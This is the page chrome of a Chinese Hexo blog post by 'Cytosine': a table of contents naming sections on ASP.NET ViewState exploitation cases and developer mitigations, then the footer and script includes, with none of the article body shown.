              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ViewState是如何使用的"><span class="nav-number">1.</span> <span class="nav-text">ViewState是如何使用的</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#案例1：目标-framework-≤-4-0（ViewState-Mac已禁用）："><span class="nav-number">1.1.</span> <span class="nav-text">案例1：目标 framework ≤ 4.0（ViewState Mac已禁用）：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#案例2：当从HTTP请求中删除ViewState时："><span class="nav-number">1.2.</span> <span class="nav-text">案例2：当从HTTP请求中删除ViewState时：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#案例3：目标-framework-≤-4-0（启用了ViewState-Mac）："><span class="nav-number">1.3.</span> <span class="nav-text">案例3：目标 framework ≤ 4.0（启用了ViewState Mac）：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#案例4：目标-framework-≤-4-0（为-ViewState-启用加密）"><span class="nav-number">1.4.</span> <span class="nav-text">案例4：目标 framework ≤ 4.0（为 ViewState 启用加密）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#案例5-目标-framework-≥-NET-4-5"><span class="nav-number">1.5.</span> <span class="nav-text">案例5: 目标 framework ≥ .NET 4.5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#案例6-使用-ViewStateUserKey"><span class="nav-number">1.6.</span> <span class="nav-text">案例6: 使用 ViewStateUserKey</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开发人员应采取什么措施来阻止漏洞利用？"><span class="nav-number">1.7.</span> <span class="nav-text">开发人员应采取什么措施来阻止漏洞利用？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">1.8.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Cytosine</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a></div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  




	





  





  









<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//unpkg.com/valine/dist/Valine.min.js"></script>



  





  

  

  

  
  

  

  

  

</body>
</html>
